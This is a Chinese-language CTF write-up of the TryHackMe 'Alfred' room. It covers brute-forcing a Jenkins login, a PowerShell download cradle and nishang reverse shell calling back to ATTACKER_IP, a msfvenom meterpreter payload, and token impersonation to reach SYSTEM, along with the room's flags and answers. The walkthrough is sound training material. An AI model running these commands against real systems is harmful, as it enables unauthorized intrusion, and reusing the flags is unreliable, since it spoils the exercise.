---
title: "Alfred Writeup"
date: 2023-06-13
tags: [writeup, ctf, tryhackme]
description: "在 TryHackMe 的 Alfred 靶机中，使用 Burp Intruder 爆破 Jenkins 登录凭据，接着通过 PowerShell 反弹 shell，最终利用令牌模拟（token impersonation）实现权限提升。"
---

读者朋友们好！

在继续往下看之前，我想先说一句：如果你是初学者，千万不要把这篇 writeup 当成走捷径的手段。不妨先回过头看看前面的训练/引导房间，复习一下，然后再来挑战这个房间。我在文章里附带了答案，而且 flag 也_未作打码处理_。但这并不意味着你应该直接复制粘贴交差了事。只有在你真正百思不得其解、彻底卡住时再来看它。

话虽如此，希望这篇内容对你有所帮助 😄

## Setup 

我们首先需要连接到 tryhackme 的 VPN 服务器。你可以访问 [Access](https://tryhackme.com/access) 页面获取更多相关信息。

我将使用 openvpn 连接到服务器。命令如下：

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

快速执行一次 `nmap` 扫描，可以获取一些有用的信息：
```shell-session
$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt TARGET_IP

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
8080/tcp open  http-proxy    syn-ack ttl 127
```

> How many ports are open? (TCP only)
>
> Answer: 3

进行操作系统指纹识别（OS Fingerprinting）以寻找合适的攻击途径：
```shell-session
$ sudo nmap -O -Pn -vv TARGET_IP
...
...
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
```

我们可以确定该服务器运行的是某种 windows 操作系统。80 端口上运行着一个 http 服务器，8080 端口上则运行着一个代理。访问 80 端口的站点，我们可以看到：
![Port 80 web-page](/assets/img/writeup_assets/alfred/port-80-page.png)

访问 8080 端口的页面，映入眼帘的是：
![Port 8080 page](/assets/img/writeup_assets/alfred/port-80-login.png)

该网页是一个登录入口，我们可以使用 `hydra` 或 burpsuite intruder 进行爆破来获取凭据。

我将使用 burpsuite 发起 sniper 模式攻击来获取凭据……
![Burpsuite Intruder Attack](/assets/img/writeup_assets/alfred/burp-intruder.png)
![Sniper Attack](/assets/img/writeup_assets/alfred/sniper-attack.png)



我们可以尝试使用拿到的凭据登录后台。

> What is the username and password for the log in panel(in the format username:password)
>
> Answer: `admin:admin`


## Gaining Access

登录后台后，我们会看到一个允许用户执行各种操作的仪表盘（dashboard）。
![Dashboard](/assets/img/writeup_assets/alfred/dashboard.png)

接下来可以使用仪表盘上的 `New Item` 工具上传 payload 并执行，从而获得反弹 shell。为此，我们首先需要一个基于 powershell 的 TCP 反向 shell。按照房间第一个任务的指引，我们这里需要使用 `nishang` 提供的 powershell 脚本。

```shell-session
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

准备好 shell 脚本后，我们就可以使用 `NewItem` 工具上传文件，并让服务器执行以下命令：
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
```

![](/assets/img/writeup_assets/alfred/initial-access-1.png)

项目创建完成后，页面会重定向到配置页面，我们可以在这里指定工作流执行前面提到的命令：

![](/assets/img/writeup_assets/alfred/initial-access-2.png)

在继续之前，我们需要在本地机器上启动一个 http 服务器，以便远程服务器可以连接并获取 powershell 脚本。
***注意***：脚本文件必须放在当前工作目录下才能生效。

```shell-session
$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

我们还需要为反弹 shell 启动一个监听器：
```shell-session
$ nc -nvlp 4445
```

一切就绪后，我们终于可以点击项目菜单左侧的 `Build Now` 选项来执行工作流了。搞定之后，我们就能拿到一个可操作的 shell：
```shell-session
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\alfred> cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

我们已经成功拿到了 user flag，现在可以着手进行提权了。

> What is the user.txt flag? 
>
> Answer: `79007a09481963edf2e1321abd9ae2a0`

## Privilege Escalation

为了更方便操作，我们在提权阶段使用 meterpreter shell。首先，我们需要为反向 shell 生成一个 payload：
```shell-session
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
```
我们需要在本地机器上开启一个监听器：
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
LHOST => ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT PORT
LPORT => PORT

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on ATTACKER_IP:PORT
```


在项目的配置中添加构建步骤，将其上传到目标机器：
```powershell
powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:PORT/shell.exe','shell.exe')"
```

构建项目后我们会重新获得之前的 shell，在其中执行以下命令：
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\alfred> Start-Process shell.exe
```

这会弹出一个 meterpreter shell。


> What is the final size of the exe payload that you generated?
>
> Answer: `73802`

既然已经拿到了顺手的 meterpreter shell，我们来看看当前拥有哪些权限：
```shell-session
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

作为用户 `alfred`，我们启用了 `SeDebugPrivilege`、`SeImpersonatePrivilege` 和 `SeCreateGlobalPrivilege` 权限。加载 `incognito` 模块后，我们就可以用它来列出令牌：

```shell-session
PS > ^C
Terminate channel 1? [y/N]  y                                                             
meterpreter > load incognito                                                              
Loading extension incognito...Success.                                                    
meterpreter > list_tokens -g                                                              
[-] Warning: Not currently running as SYSTEM, not all tokens will be available            
             Call rev2self if primary process token is SYSTEM                             
                                                                                          
Delegation Tokens Available                                                               
========================================                                                  
\                                                                                         
BUILTIN\Administrators                                                                    
BUILTIN\IIS_IUSRS                                                                         
BUILTIN\Users                                                                             
NT AUTHORITY\Authenticated Users                                                          
NT AUTHORITY\NTLM Authentication                                                          
NT AUTHORITY\SERVICE                                                                      
NT AUTHORITY\This Organization                                                            
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\swprv
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\VSS
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

既然 `BUILTIN\Administrators` 令牌可用，我们就可以使用以下命令来模拟管理员令牌：
```shell-session
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

运行 `getuid` 命令，我们可以确认自己已经获得了管理员权限：
```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> What is the output when you run the getuid command?
>
> Answer: `NT AUTHORITY\SYSTEM`

按照任务的建议，我们现在来迁移这个进程：
```shell-session
meterpreter > ps
...

668   580   services.exe   x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\se
                                                                  rvices.exe
...

meterpreter > migrate 668
[*] Migrating from 2176 to 668...
[*] Migration completed successfully.
meterpreter > cat "C:\Windows\System32\config\root.txt" 
��dff0f748678f280250f25a45b8046b4a
```

> read the root.txt file at `C:\Windows\System32\config`
>
> Answer: `dff0f748678f280250f25a45b8046b4a`

## Conclusion

如果这篇 writeup 对你有帮助，欢迎在 [github](https://github.com/NovusEdge) 上关注我，或者给仓库点个 star：https://github.com/NovusEdge/thm-writeups


- Room: [Alfred](https://tryhackme.com/room/alfred)
